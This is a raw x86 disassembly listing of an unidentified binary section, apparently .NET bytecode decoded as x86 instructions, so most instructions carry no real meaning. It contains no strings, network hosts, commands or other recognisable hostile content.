  4031ab:	outs   dx,DWORD PTR ds:[esi]
  4031ac:	xchg   edi,eax
  4031ad:	add    BYTE PTR [eax],al
  4031af:	or     ch,BYTE PTR ds:0xf672030e
  4031b5:	or     al,BYTE PTR [eax]
  4031b7:	jo     0x4031d4
  4031b9:	outs   dx,DWORD PTR ds:[esi]
  4031ba:	xchg   edi,eax
  4031bb:	add    BYTE PTR [eax],al
  4031bd:	or     ch,BYTE PTR [ecx+edx*1]
  4031c0:	add    edx,DWORD PTR [edi]
  4031c2:	outs   dx,DWORD PTR ds:[esi]
  4031c3:	cwde   
  4031c4:	add    BYTE PTR [eax],al
  4031c6:	or     dl,BYTE PTR [eax]
  4031c8:	add    DWORD PTR [esi+0x52],edi
  4031cb:	add    BYTE PTR [eax],al
  4031cd:	add    al,0xa
  4031cf:	sub    eax,DWORD PTR [esi]
  4031d1:	jle    0x403226
  4031d3:	add    BYTE PTR [eax],al
  4031d5:	add    al,0xa
  4031d7:	push   es
  4031d8:	or     eax,0x2b041316
  4031dd:	xor    DWORD PTR [ecx],ecx
  4031df:	adc    DWORD PTR [edi+ecx*4],eax
  4031e2:	adc    al,BYTE PTR [eax]
  4031e4:	add    BYTE PTR [edx],al
  4031e6:	jno    0x4031fa
  4031e8:	add    BYTE PTR [eax],al
  4031ea:	add    cl,BYTE PTR [ebx]
  4031ec:	add    edx,DWORD PTR [edx]
  4031ee:	add    DWORD PTR [ebx-0x3d],edi
  4031f1:	add    BYTE PTR [eax],al
  4031f3:	add    al,0x1b
  4031f5:	outs   dx,DWORD PTR ds:[esi]
  4031f6:	cdq    
  4031f7:	add    BYTE PTR [eax],al
  4031f9:	or     ch,BYTE PTR [ecx*1+0x7b011204]
  403200:	les    eax,FWORD PTR [eax]
  403202:	add    BYTE PTR [esp+edx*2],al
  403205:	pop    ss
  403206:	or     al,0xde
  403208:	movups XMMWORD PTR [edi+edx*1],xmm0
  40320c:	pop    eax
  40320d:	adc    eax,DWORD PTR [ecx+edx*1]
  403210:	add    al,0x9
  403212:	mov    gs,WORD PTR [ecx+0x32]
  403215:	enter  0x2a16,0x8
  403219:	sub    bl,BYTE PTR [esi]
  40321b:	add    bh,BYTE PTR [ebx+0x55]
  40321e:	add    BYTE PTR [eax],al
  403220:	add    al,0x2a
  403222:	push   ds
  403223:	add    bh,BYTE PTR [ebx+0x56]
  403226:	add    BYTE PTR [eax],al
  403228:	add    al,0x2a
  40322a:	push   ds
  40322b:	add    bh,BYTE PTR [ebx+0x57]
  40322e:	add    BYTE PTR [eax],al
  403230:	add    al,0x2a
  403232:	push   ds
  403233:	add    bh,BYTE PTR [ebx+0x58]
  403236:	add    BYTE PTR [eax],al
  403238:	add    al,0x2a
  40323a:	add    BYTE PTR [eax],al
  40323c:	adc    esi,DWORD PTR [eax]
  40323e:	pop    es
  40323f:	add    BYTE PTR [eax+eax*1+0xe0000],cl
  403246:	add    BYTE PTR [ecx],dl
  403248:	push   ss
  403249:	or     dl,BYTE PTR [esi]
  40324b:	or     edx,DWORD PTR [esi]
  40324d:	or     al,0x16
  40324f:	or     eax,0x73041316
  403254:	sbb    eax,0x13060000
  403259:	add    eax,0x2b061316
  40325e:	ins    DWORD PTR es:[edi],dx
  40325f:	add    edx,DWORD PTR [ecx]
  403261:	push   es
  403262:	call   0x1207:0x11020713
  403269:	or     BYTE PTR [eax],ch
  40326b:	add    BYTE PTR ss:[eax],al
  40326e:	push   es
  40326f:	es push es
  403271:	adc    ecx,DWORD PTR [ecx]
  403273:	adc    DWORD PTR [ecx],ecx
  403275:	inc    ebp
  403276:	add    eax,0x2000000
  40327b:	add    BYTE PTR [eax],al
  40327d:	add    BYTE PTR [eax+eax*1],dl
  403280:	add    BYTE PTR [eax],al
  403282:	add    BYTE PTR es:[eax],al
  403285:	add    BYTE PTR [eax],bh
  403287:	add    BYTE PTR [eax],al
  403289:	add    BYTE PTR [eax],bh
  40328b:	add    BYTE PTR [eax],al
  40328d:	add    BYTE PTR [ebx],ch
  40328f:	add    dl,BYTE PTR ss:[ecx]
  403292:	pop    es
  403293:	adc    DWORD PTR [eax],ecx
  403295:	adc    al,BYTE PTR [eax]
  403297:	adc    al,BYTE PTR [edx]
  403299:	adc    al,BYTE PTR [ebx]
  40329b:	sub    BYTE PTR [edi],bh
  40329d:	add    BYTE PTR [eax],al
  40329f:	push   es
  4032a0:	sub    esp,DWORD PTR [edx+eax*1]
  4032a3:	adc    DWORD PTR [edi],eax
  4032a5:	adc    DWORD PTR [eax],ecx
  4032a7:	adc    al,BYTE PTR [eax]
  4032a9:	adc    al,BYTE PTR [ecx]
  4032ab:	adc    al,BYTE PTR [ebx]
  4032ad:	sub    BYTE PTR ds:0x2b060000,bh
  4032b3:	adc    al,BYTE PTR [edx]
  4032b5:	adc    DWORD PTR [edi],eax
  4032b7:	adc    DWORD PTR [eax],ecx
  4032b9:	adc    al,BYTE PTR [eax]
  4032bb:	adc    al,BYTE PTR [edx+edx*1]
  4032be:	add    edx,DWORD PTR [edx]
  4032c0:	add    eax,0x3c28
  4032c5:	push   es
  4032c6:	adc    DWORD PTR [esi],eax
  4032c8:	pop    ss
  4032c9:	pop    eax
  4032ca:	adc    eax,DWORD PTR [esi]
  4032cc:	adc    DWORD PTR [esi],eax
  4032ce:	add    ecx,DWORD PTR [esi+0x2a8c3269]
  4032d4:	adc    esi,DWORD PTR [eax]
  4032d6:	add    eax,0x12300
  4032db:	add    BYTE PTR [edi],cl
  4032dd:	add    BYTE PTR [eax],al
  4032df:	adc    DWORD PTR [esi],ecx
  4032e1:	add    al,0x4a
  4032e3:	or     al,BYTE PTR [esi]
  4032e5:	inc    ebp
  4032e6:	push   es
  4032e7:	add    BYTE PTR [eax],al
  4032e9:	add    BYTE PTR [ecx],al
  4032eb:	add    BYTE PTR [eax],al
  4032ed:	add    BYTE PTR [edx-0x7d000000],dl
  4032f3:	add    BYTE PTR [eax],al
  4032f5:	add    BYTE PTR [ebp-0x25000000],ch
  4032fb:	add    BYTE PTR [eax],al
  4032fd:	add    BYTE PTR [ebp+0x0],bl
  403300:	add    BYTE PTR [eax],al
  403302:	sub    bl,BYTE PTR [edi]
  403304:	sbb    DWORD PTR [ebx+esi*1],eax
  403307:	push   ss
  403308:	add    bh,BYTE PTR [ebx+0x57]
  40330b:	add    BYTE PTR [eax],al
  40330d:	add    al,0x6f
  40330f:	inc    ebp
  403310:	add    BYTE PTR [eax],al
  403312:	push   es
  403313:	pop    ss
  403314:	outs   dx,DWORD PTR ds:[esi]
  403315:	call   0x1604:0xe0a0000
  40331c:	push   esp
  40331d:	sub    bl,BYTE PTR [edi]
  40331f:	sbb    al,BYTE PTR [ebx+esi*1]
  403322:	add    eax,0x5417040e
  403327:	sub    bl,BYTE PTR [edi]
  403329:	sbb    eax,DWORD PTR [ebx+esi*1]
  40332c:	add    eax,0x5419040e
  403331:	sub    bl,BYTE PTR [edi]
  403333:	sbb    al,0x4
  403335:	xor    eax,DWORD PTR ds:0x541b040e
  40333b:	sub    bl,BYTE PTR [edi]
  40333d:	push   ds
  40333e:	add    al,0x33
  403340:	adc    al,BYTE PTR [edx]
  403342:	jnp    0x40339b
  403344:	add    BYTE PTR [eax],al
  403346:	add    al,0x6f
  403348:	inc    esi
  403349:	add    BYTE PTR [eax],al
  40334b:	push   es
  40334c:	pop    ss
  40334d:	outs   dx,DWORD PTR ds:[esi]
  40334e:	call   0x5c28:0x2a0a0000
  403355:	add    BYTE PTR [eax],al
  403357:	push   es
  403358:	add    esi,DWORD PTR [ebx+0x45]
  40335b:	add    BYTE PTR [eax],al
  40335d:	or     bh,BYTE PTR [edx+0x2]
  403360:	sub    BYTE PTR [ecx],bh
  403362:	add    BYTE PTR [eax],al
  403364:	push   es
  403365:	outs   dx,DWORD PTR ds:[esi]
  403366:	dec    ecx
  403367:	add    BYTE PTR [eax],al
  403369:	push   es
  40336a:	add    ebp,DWORD PTR [eax]
  40336c:	outs   dx,DWORD PTR ds:[esi]
  40336d:	add    BYTE PTR [eax],al
  40336f:	or     ch,BYTE PTR [eax]
  403371:	lea    eax,[eax]
  403373:	add    BYTE PTR [edx],cl
  403375:	ins    BYTE PTR es:[edi],dx
  403376:	sub    BYTE PTR [ebx+0x6f0a0000],bl
  40337c:	pushf  
  40337d:	add    BYTE PTR [eax],al
  40337f:	or     cl,BYTE PTR [esi]
  403381:	add    al,0x16
  403383:	push   esp
  403384:	sub    al,BYTE PTR [edx]
  403386:	pop    ds
  403387:	sbb    eax,DWORD PTR [ebx+eax*1]
  40338a:	sub    BYTE PTR [esi],bh
  40338c:	add    BYTE PTR [eax],al
  40338e:	push   es
  40338f:	push   cs
  403390:	add    al,0x19
  403392:	push   esp
  403393:	sub    al,BYTE PTR [edx]
  403395:	jnp    0x4033ee
  403397:	add    BYTE PTR [eax],al
  403399:	add    al,0x6f
  40339b:	inc    edi
  40339c:	add    BYTE PTR [eax],al
  40339e:	push   es
  40339f:	add    esi,DWORD PTR [ebx-0x63]
  4033a2:	add    BYTE PTR [eax],al
  4033a4:	or     ch,BYTE PTR [edi-0x62]
  4033a7:	add    BYTE PTR [eax],al
  4033a9:	or     cl,BYTE PTR [esi]
  4033ab:	add    al,0x16
  4033ad:	push   esp
  4033ae:	sub    al,BYTE PTR [edx]
  4033b0:	pop    ds
  4033b1:	push   cs
  4033b2:	add    al,0x3
  4033b4:	sub    BYTE PTR [esi],bh
  4033b6:	add    BYTE PTR [eax],al
  4033b8:	push   es
  4033b9:	push   cs
  4033ba:	add    al,0x1a
  4033bc:	push   esp
  4033bd:	push   cs
  4033be:	add    eax,0x60e5416
  4033c3:	jae    0x4033e2
  4033c5:	add    BYTE PTR [eax],al
  4033c7:	push   es
  4033c8:	push   ecx
  4033c9:	add    bh,BYTE PTR [ebx+0x57]
  4033cc:	add    BYTE PTR [eax],al
  4033ce:	add    al,0x6f
  4033d0:	dec    eax
  4033d1:	add    BYTE PTR [eax],al
  4033d3:	push   es
  4033d4:	push   cs
  4033d5:	push   es
  4033d6:	push   eax
  4033d7:	outs   dx,DWORD PTR ds:[esi]
  4033d8:	cmp    al,BYTE PTR [eax]
  4033da:	add    BYTE PTR [edx],cl
  4033dc:	sub    bl,BYTE PTR [edi]
  4033de:	sbb    eax,DWORD PTR [ebx+esi*1]
  4033e1:	add    eax,0x5419040e
  4033e6:	sub    al,BYTE PTR [edx]
  4033e8:	add    eax,DWORD PTR [esi+ecx*1]
  4033eb:	add    eax,0x2850060e
  4033f0:	inc    eax
  4033f1:	add    BYTE PTR [eax],al
  4033f3:	push   es
  4033f4:	sub    al,0x1
  4033f6:	sub    ch,BYTE PTR [eax]
  4033f8:	pop    esp
  4033f9:	add    BYTE PTR [eax],al
  4033fb:	push   es
  4033fc:	add    esi,DWORD PTR [ebx+0x45]
  4033ff:	add    BYTE PTR [eax],al
  403401:	or     bh,BYTE PTR [edx+0x0]
  403404:	adc    esi,DWORD PTR [eax]
  403406:	add    eax,0x2a000
  40340b:	add    BYTE PTR [eax],dl
  40340d:	add    BYTE PTR [eax],al
  40340f:	adc    DWORD PTR [esi],ecx
  403411:	add    al,0x4a
  403413:	or     al,BYTE PTR [esi]
  403415:	inc    ebp
  403416:	adc    BYTE PTR [eax],al
  403418:	add    BYTE PTR [eax],al
  40341a:	add    eax,0x14000000
  40341f:	add    BYTE PTR [eax],al
  403421:	add    BYTE PTR [ebx],ah
  403423:	add    BYTE PTR [eax],al
  403425:	add    BYTE PTR [esi],bh
  403427:	add    BYTE PTR [eax],al
  403429:	add    BYTE PTR [ecx+0x4a000000],dl
  40342f:	add    al,BYTE PTR [eax]
  403431:	add    dl,bl
  403433:	add    BYTE PTR [eax],al
  403435:	add    cl,ch
  403437:	add    BYTE PTR [eax],al
  403439:	add    BYTE PTR [edx],ch
  40343b:	add    DWORD PTR [eax],eax
  40343d:	add    BYTE PTR [ecx+eax*1],bh
  403440:	add    BYTE PTR [eax],al
  403442:	pop    eax
  403443:	add    DWORD PTR [eax],eax
  403445:	add    BYTE PTR [edx-0x1effffff],ah
  40344b:	add    DWORD PTR [eax],eax
  40344d:	add    cl,dh
  40344f:	add    DWORD PTR [eax],eax
  403451:	add    BYTE PTR [eax],cl
  403453:	add    al,BYTE PTR [eax]
  403455:	add    BYTE PTR [eax],bl
  403457:	add    al,BYTE PTR [eax]
  403459:	add    BYTE PTR [eax],bh
  40345b:	inc    ebp
  40345c:	add    al,BYTE PTR [eax]
  40345e:	add    BYTE PTR [edx],al
  403460:	pop    ds
  403461:	or     eax,0x3e280304
  403466:	add    BYTE PTR [eax],al
  403468:	push   es
  403469:	push   cs
  40346a:	add    al,0x17
  40346c:	push   esp
  40346d:	sub    al,BYTE PTR [edx]
  40346f:	pop    ds
  403470:	(bad)  
  403472:	add    ebp,DWORD PTR [eax]
  403474:	add    BYTE PTR ds:[eax],al
  403477:	push   es
  403478:	push   cs
  403479:	add    al,0x18
  40347b:	push   esp
  40347c:	sub    al,BYTE PTR [edx]
  40347e:	sub    BYTE PTR [eax],bh
  403480:	add    BYTE PTR [eax],al
  403482:	push   es
  403483:	outs   dx,DWORD PTR ds:[esi]
  403484:	adc    BYTE PTR [eax],al
  403486:	add    BYTE PTR [esi],al
  403488:	outs   dx,DWORD PTR ds:[esi]
  403489:	dec    ebx
  40348a:	add    BYTE PTR [eax],al
  40348c:	push   es
  40348d:	add    ebp,DWORD PTR [edi-0x6b]
  403490:	add    BYTE PTR [eax],al
  403492:	or     cl,BYTE PTR [esi]
  403494:	add    al,0x19
  403496:	push   esp
  403497:	sub    al,BYTE PTR [edx]
  403499:	add    eax,DWORD PTR [esi+ecx*1]
  40349c:	add    eax,0x382802
  4034a1:	add    BYTE PTR [esi],al
  4034a3:	outs   dx,DWORD PTR ds:[esi]
  4034a4:	adc    BYTE PTR [eax],al
  4034a6:	add    BYTE PTR [esi],al
  4034a8:	outs   dx,DWORD PTR ds:[esi]
  4034a9:	dec    ebp
  4034aa:	add    BYTE PTR [eax],al
  4034ac:	push   es
  4034ad:	sub    BYTE PTR [eax+0x0],al
  4034b0:	add    BYTE PTR [esi],al
  4034b2:	sub    al,0x1
  4034b4:	sub    al,BYTE PTR [edi+ebx*1]
  4034b7:	push   cs
  4034b8:	xor    eax,DWORD PTR ds:0x541c040e
  4034be:	sub    al,BYTE PTR [edi+ebx*1]
  4034c1:	adc    DWORD PTR [ebx],esi
  4034c3:	add    eax,0x541a040e
  4034c8:	sub    al,BYTE PTR [edi+ebx*1]
  4034cb:	adc    esi,DWORD PTR [ebx]
  4034cd:	push   es
  4034ce:	push   cs
  4034cf:	add    al,0x1f
  4034d1:	or     al,0x54
  4034d3:	sub    al,BYTE PTR [edi+ebx*1]
  4034d6:	adc    dh,BYTE PTR [ebx]
  4034d8:	push   es
  4034d9:	push   cs
  4034da:	add    al,0x1f
  4034dc:	andps  xmm5,XMMWORD PTR [edx]
  4034df:	sub    BYTE PTR [eax+eax*1+0x0],bl
  4034e3:	push   es
  4034e4:	add    esi,DWORD PTR [ebx+0x45]
  4034e7:	add    BYTE PTR [eax],al
  4034e9:	or     bh,BYTE PTR [edx+0x2]
  4034ec:	add    eax,DWORD PTR [esi+ecx*1]
  4034ef:	add    eax,0x382802
  4034f4:	add    BYTE PTR [esi],al
  4034f6:	outs   dx,DWORD PTR ds:[esi]
  4034f7:	adc    BYTE PTR [eax],al
  4034f9:	add    BYTE PTR [esi],al
  4034fb:	outs   dx,DWORD PTR ds:[esi]
  4034fc:	dec    esi
  4034fd:	add    BYTE PTR [eax],al
  4034ff:	push   es
  403500:	sub    BYTE PTR [eax+0x0],al
  403503:	add    BYTE PTR [esi],al
  403505:	sub    al,0x1
  403507:	sub    al,BYTE PTR [edi+ebx*1]
  40350a:	push   cs
  40350b:	xor    eax,DWORD PTR ds:0x541c040e
  403511:	sub    al,BYTE PTR [edi+ebx*1]
  403514:	adc    esi,DWORD PTR [ebx]
  403516:	push   es
  403517:	push   cs
  403518:	add    al,0x1f
  40351a:	or     al,0x54
  40351c:	sub    al,BYTE PTR [edi+ebx*1]
  40351f:	adc    dh,BYTE PTR [ebx]
  403521:	push   es
  403522:	push   cs
  403523:	add    al,0x1f
  403525:	andps  xmm5,XMMWORD PTR [edx]
  403528:	sub    BYTE PTR [eax+eax*1+0x0],bl
  40352c:	push   es
  40352d:	add    esi,DWORD PTR [ebx+0x45]
  403530:	add    BYTE PTR [eax],al
  403532:	or     bh,BYTE PTR [edx+0x2]
  403535:	pop    ds
  403536:	(bad)  
  403538:	add    ebp,DWORD PTR [eax]
  40353a:	add    BYTE PTR ds:[eax],al
  40353d:	push   es
  40353e:	push   cs
  40353f:	add    al,0x1d
  403541:	push   esp
  403542:	sub    al,BYTE PTR [ebx]
  403544:	jb     0x403540
  403546:	or     al,BYTE PTR [eax]
  403548:	jo     0x403561
  40354a:	outs   dx,DWORD PTR ds:[esi]
  40354b:	lahf   
  40354c:	add    BYTE PTR [eax],al
  40354e:	or     ch,BYTE PTR [eax+ebx*1]
  403551:	add    edx,DWORD PTR [esi]
  403553:	add    ebp,DWORD PTR [edi-0x6a]
  403556:	add    BYTE PTR [eax],al
  403558:	or     dl,BYTE PTR [edi]
  40355a:	pop    ecx
  40355b:	outs   dx,DWORD PTR ds:[esi]
  40355c:	mov    al,ds:0x100a0000
  403561:	add    DWORD PTR [esi],ecx
  403563:	add    al,0x1f
  403565:	or     DWORD PTR [ebx+ebp*1+0x4],edx
  403569:	push   cs
  40356a:	add    al,0x1e
  40356c:	push   esp
  40356d:	add    ch,BYTE PTR [eax]
  40356f:	cmp    BYTE PTR [eax],al
  403571:	add    BYTE PTR [esi],al
  403573:	outs   dx,DWORD PTR ds:[esi]
  403574:	adc    DWORD PTR [eax],eax
  403576:	add    BYTE PTR [esi],al
  403578:	outs   dx,DWORD PTR ds:[esi]
  403579:	dec    ebx
  40357a:	add    BYTE PTR [eax],al
  40357c:	push   es
  40357d:	add    ebp,DWORD PTR [edi-0x6b]
  403580:	add    BYTE PTR [eax],al
  403582:	or     ch,BYTE PTR [edx]
  403584:	add    al,0x1f
  403586:	push   ss
  403587:	xor    eax,DWORD PTR [esi]
  403589:	push   cs
  40358a:	add    al,0x1f
  40358c:	or     DWORD PTR [edx+ebp*1+0xe],edx
  403590:	add    al,0x1f
  403592:	or     dl,BYTE PTR [ebx+ebp*1+0x1c]
  403596:	add    ch,BYTE PTR [eax]
  403598:	cmp    BYTE PTR [eax],al
  40359a:	add    BYTE PTR [esi],al
  40359c:	outs   dx,DWORD PTR ds:[esi]
  40359d:	adc    DWORD PTR [eax],eax
  40359f:	add    BYTE PTR [esi],al
  4035a1:	outs   dx,DWORD PTR ds:[esi]
  4035a2:	dec    esp
  4035a3:	add    BYTE PTR [eax],al
  4035a5:	push   es
  4035a6:	add    ebp,DWORD PTR [edi-0x6b]
  4035a9:	add    BYTE PTR [eax],al
  4035ab:	or     cl,BYTE PTR [esi]
  4035ad:	add    al,0x1f
  4035af:	or     dl,BYTE PTR [edx+ebp*1+0x2]
  4035b3:	add    eax,DWORD PTR [esi+ecx*1]
  4035b6:	add    eax,0x382802
  4035bb:	add    BYTE PTR [esi],al
  4035bd:	outs   dx,DWORD PTR ds:[esi]
  4035be:	adc    DWORD PTR [eax],eax
  4035c0:	add    BYTE PTR [esi],al
  4035c2:	outs   dx,DWORD PTR ds:[esi]
  4035c3:	dec    ebp
  4035c4:	add    BYTE PTR [eax],al
  4035c6:	push   es
  4035c7:	sub    BYTE PTR [eax+0x0],al
  4035ca:	add    BYTE PTR [esi],al
  4035cc:	sub    al,0x1
  4035ce:	sub    al,BYTE PTR [edi+ebx*1]
  4035d1:	adc    DWORD PTR [ebx],esi
  4035d3:	push   es
  4035d4:	push   cs
  4035d5:	add    al,0x1f
  4035d7:	or     edx,DWORD PTR [edx+ebp*1+0x4]
  4035db:	pop    ds
  4035dc:	adc    esi,DWORD PTR [ebx]
  4035de:	push   es
  4035df:	push   cs
  4035e0:	add    al,0x1f
  4035e2:	or     al,0x54
  4035e4:	sub    al,BYTE PTR [edi+ebx*1]
  4035e7:	adc    dh,BYTE PTR [ebx]
  4035e9:	push   es
  4035ea:	push   cs
  4035eb:	add    al,0x1f
  4035ed:	andps  xmm5,XMMWORD PTR [edx]
  4035f0:	sub    BYTE PTR [eax+eax*1+0x0],bl
  4035f4:	push   es
  4035f5:	add    esi,DWORD PTR [ebx+0x45]
  4035f8:	add    BYTE PTR [eax],al
  4035fa:	or     bh,BYTE PTR [edx+0x2]
  4035fd:	add    eax,DWORD PTR [esi+ecx*1]
  403600:	add    eax,0x382802
  403605:	add    BYTE PTR [esi],al
  403607:	outs   dx,DWORD PTR ds:[esi]
  403608:	adc    DWORD PTR [eax],eax
  40360a:	add    BYTE PTR [esi],al
  40360c:	outs   dx,DWORD PTR ds:[esi]
  40360d:	dec    esi
  40360e:	add    BYTE PTR [eax],al
  403610:	push   es
  403611:	sub    BYTE PTR [eax+0x0],al
  403614:	add    BYTE PTR [esi],al
  403616:	sub    al,0x1
  403618:	sub    al,BYTE PTR [edi+ebx*1]
  40361b:	adc    esi,DWORD PTR [ebx]
  40361d:	push   es
  40361e:	push   cs
  40361f:	add    al,0x1f
  403621:	or     al,0x54
  403623:	sub    al,BYTE PTR [edi+ebx*1]
  403626:	adc    dh,BYTE PTR [ebx]
  403628:	push   es
  403629:	push   cs
  40362a:	add    al,0x1f
  40362c:	andps  xmm5,XMMWORD PTR [edx]
  40362f:	sub    BYTE PTR [eax+eax*1+0x0],bl
  403633:	push   es
  403634:	add    esi,DWORD PTR [ebx+0x45]
  403637:	add    BYTE PTR [eax],al
  403639:	or     bh,BYTE PTR [edx+0x2]
  40363c:	pop    ds
  40363d:	adc    BYTE PTR [ebx+eax*1],al
  403640:	sub    BYTE PTR [esi],bh
  403642:	add    BYTE PTR [eax],al
  403644:	push   es
  403645:	push   cs
  403646:	add    al,0x1f
  403648:	or     eax,0x28022a54
  40364d:	cmp    BYTE PTR [eax],al
  40364f:	add    BYTE PTR [esi],al
  403651:	outs   dx,DWORD PTR ds:[esi]
  403652:	adc    al,BYTE PTR [eax]
  403654:	add    BYTE PTR [esi],al
  403656:	add    ebp,DWORD PTR [edi-0x6b]
  403659:	add    BYTE PTR [eax],al
  40365b:	or     cl,BYTE PTR [esi]
  40365d:	add    al,0x1f
  40365f:	push   cs
  403660:	push   esp
  403661:	sub    al,BYTE PTR [edx]
  403663:	pop    ds
  403664:	adc    al,BYTE PTR [ebx+eax*1]
  403667:	sub    BYTE PTR [esi],bh
  403669:	add    BYTE PTR [eax],al
  40366b:	push   es
  40366c:	push   cs
  40366d:	add    al,0x1f
  40366f:	andps  xmm5,XMMWORD PTR [edx]
  403672:	add    al,0x1f
  403674:	adc    ebp,DWORD PTR [esi]
  403676:	or     al,BYTE PTR [edi+ebx*1]
  403679:	adc    al,0x2e
  40367b:	add    eax,0x33151f04
  403680:	pop    ss
  403681:	add    ch,BYTE PTR [eax]
  403683:	cmp    BYTE PTR [eax],al
  403685:	add    BYTE PTR [esi],al
  403687:	outs   dx,DWORD PTR ds:[esi]
  403688:	adc    eax,DWORD PTR [eax]
  40368a:	add    BYTE PTR [esi],al
  40368c:	add    ebp,DWORD PTR [edi-0x6b]
  40368f:	add    BYTE PTR [eax],al
  403691:	or     cl,BYTE PTR [esi]
  403693:	add    al,0x1f
  403695:	adc    BYTE PTR [edx+ebp*1+0x28],dl
  403699:	pop    esp
  40369a:	add    BYTE PTR [eax],al
  40369c:	push   es
  40369d:	add    esi,DWORD PTR [ebx+0x45]
  4036a0:	add    BYTE PTR [eax],al
  4036a2:	or     bh,BYTE PTR [edx+0x28]
  4036a5:	pop    esp
  4036a6:	add    BYTE PTR [eax],al
  4036a8:	push   es
  4036a9:	add    esi,DWORD PTR [ebx+0x45]
  4036ac:	add    BYTE PTR [eax],al
  4036ae:	or     bh,BYTE PTR [edx+0x46]
  4036b1:	add    eax,DWORD PTR [esi+ebp*1]
  4036b4:	or     al,0x28
  4036b6:	pop    esp
  4036b7:	add    BYTE PTR [eax],al
  4036b9:	push   es
  4036ba:	add    eax,0x4573
  4036bf:	or     bh,BYTE PTR [edx+0x2a]
  4036c2:	add    BYTE PTR [eax],al
  4036c4:	adc    esi,DWORD PTR [eax]
  4036c6:	add    eax,0xf200
  4036cb:	add    BYTE PTR [ecx],dl
  4036cd:	add    BYTE PTR [eax],al
  4036cf:	adc    DWORD PTR [edi],edx
  4036d1:	push   cs
  4036d2:	add    al,0x4a
  4036d4:	xor    edi,DWORD PTR [edx]
  4036d6:	add    al,0xa
  4036d8:	push   es
  4036d9:	sbb    DWORD PTR [ecx+0x45],ebx
  4036dc:	add    eax,DWORD PTR [eax]
  4036de:	add    BYTE PTR [eax],al
  4036e0:	add    al,BYTE PTR [eax]
  4036e2:	add    BYTE PTR [eax],al
  4036e4:	add    al,BYTE PTR [eax]
  4036e6:	add    BYTE PTR [eax],al
  4036e8:	add    al,BYTE PTR [eax]
  4036ea:	add    BYTE PTR [eax],al
  4036ec:	sub    edx,DWORD PTR [esi]
  4036ee:	add    ch,BYTE PTR [eax]
  4036f0:	aaa    
  4036f1:	add    BYTE PTR [eax],al
  4036f3:	push   es
  4036f4:	outs   dx,DWORD PTR ds:[esi]
  4036f5:	and    DWORD PTR [eax],eax
  4036f7:	add    BYTE PTR [esi],al
  4036f9:	add    ebp,DWORD PTR [edi-0x6b]
  4036fc:	add    BYTE PTR [eax],al
  4036fe:	or     cl,BYTE PTR [esi]
  403700:	add    al,0x16
  403702:	push   esp
  403703:	sub    ch,BYTE PTR [eax]
  403705:	pop    esp
  403706:	add    BYTE PTR [eax],al
  403708:	push   es
  403709:	add    esi,DWORD PTR [ebx+0x45]
  40370c:	add    BYTE PTR [eax],al
  40370e:	or     bh,BYTE PTR [edx+0x18]
  403711:	push   cs
  403712:	add    al,0x4a
  403714:	xor    ebx,DWORD PTR [ebx]
  403716:	add    ch,BYTE PTR [eax]
  403718:	aaa    
  403719:	add    BYTE PTR [eax],al
  40371b:	push   es
  40371c:	add    ebp,DWORD PTR [eax]
  40371e:	outs   dx,DWORD PTR ds:[esi]
  40371f:	add    BYTE PTR [eax],al
  403721:	or     ch,BYTE PTR [eax]
  403723:	lea    eax,[eax]
  403725:	add    BYTE PTR [edx],cl
  403727:	outs   dx,DWORD PTR ds:[esi]
  403728:	and    al,0x0
  40372a:	add    BYTE PTR [esi],al
  40372c:	push   cs
  40372d:	add    al,0x16
  40372f:	push   esp
  403730:	sub    bl,BYTE PTR [edi]
  403732:	pop    ss
  403733:	add    al,0x33
  403735:	adc    eax,0x372802
  40373a:	add    BYTE PTR [esi],al
  40373c:	outs   dx,DWORD PTR ds:[esi]
  40373d:	and    eax,DWORD PTR [eax]
  40373f:	add    BYTE PTR [esi],al
  403741:	pop    ss
  403742:	outs   dx,DWORD PTR ds:[esi]
  403743:	call   0x541a:0x50a0000
  40374a:	sub    dl,BYTE PTR [edi]
  40374c:	add    al,0x33
  40374e:	adc    al,BYTE PTR [edx]
  403750:	sub    BYTE PTR [edi],dh
  403752:	add    BYTE PTR [eax],al
  403754:	push   es
  403755:	outs   dx,DWORD PTR ds:[esi]
  403756:	and    BYTE PTR [eax],al
  403758:	add    BYTE PTR [esi],al
  40375a:	pop    ss
  40375b:	outs   dx,DWORD PTR ds:[esi]
  40375c:	call   0x1804:0x2a0a0000
  403763:	xor    eax,DWORD PTR ds:0x5417040e
  403769:	sub    al,BYTE PTR [edi+ebx*1]
  40376c:	sbb    eax,0x40e0533
  403771:	sbb    BYTE PTR [edx+ebp*1+0x1f],dl
  403775:	or     al,0x4
  403777:	xor    edx,DWORD PTR [eax]
  403779:	add    bh,BYTE PTR [ebx+0x58]
  40377c:	add    BYTE PTR [eax],al
  40377e:	add    al,0x17
  403780:	outs   dx,DWORD PTR ds:[esi]
  403781:	mov    eax,ds:0x50a0000
  403786:	pop    ss
  403787:	push   esp
  403788:	sub    bl,BYTE PTR [edi]
  40378a:	sbb    BYTE PTR [ebx+esi*1],al
  40378d:	adc    BYTE PTR [edx],al
  40378f:	jnp    0x4037e9
  403791:	add    BYTE PTR [eax],al
  403793:	add    al,0x18
  403795:	outs   dx,DWORD PTR ds:[esi]
  403796:	mov    eax,ds:0x50a0000
  40379b:	sbb    BYTE PTR [edx+ebp*1+0x2],dl
  40379f:	add    eax,DWORD PTR [esi+ecx*1]
  4037a2:	add    eax,0x372802
  4037a7:	add    BYTE PTR [esi],al
  4037a9:	outs   dx,DWORD PTR ds:[esi]
  4037aa:	and    al,BYTE PTR [eax]
  4037ac:	add    BYTE PTR [esi],al
  4037ae:	sub    BYTE PTR [eax+0x0],al
  4037b1:	add    BYTE PTR [esi],al
  4037b3:	sub    al,0x1
  4037b5:	sub    ch,BYTE PTR [eax]
  4037b7:	pop    esp
  4037b8:	add    BYTE PTR [eax],al
  4037ba:	push   es
  4037bb:	add    esi,DWORD PTR [ebx+0x45]
  4037be:	add    BYTE PTR [eax],al
  4037c0:	or     bh,BYTE PTR [edx+0x0]
  4037c3:	add    BYTE PTR [ebx],dl
  4037c5:	xor    BYTE PTR [ebx],al
  4037c7:	add    BYTE PTR [ebx],cl
  4037c9:	add    DWORD PTR [eax],eax
  4037cb:	add    BYTE PTR [edx],dl
  4037cd:	add    BYTE PTR [eax],al
  4037cf:	adc    DWORD PTR [esi],edx
  4037d1:	or     al,BYTE PTR ds:0x45070b4a
  4037d7:	push   es
  4037d8:	add    BYTE PTR [eax],al
  4037da:	add    BYTE PTR [eax+eax*1+0x0],bh
  4037de:	add    BYTE PTR ds:0x1c000000,al
  4037e4:	add    BYTE PTR [eax],al
  4037e6:	add    BYTE PTR [ebx],dh
  4037e8:	add    BYTE PTR [eax],al
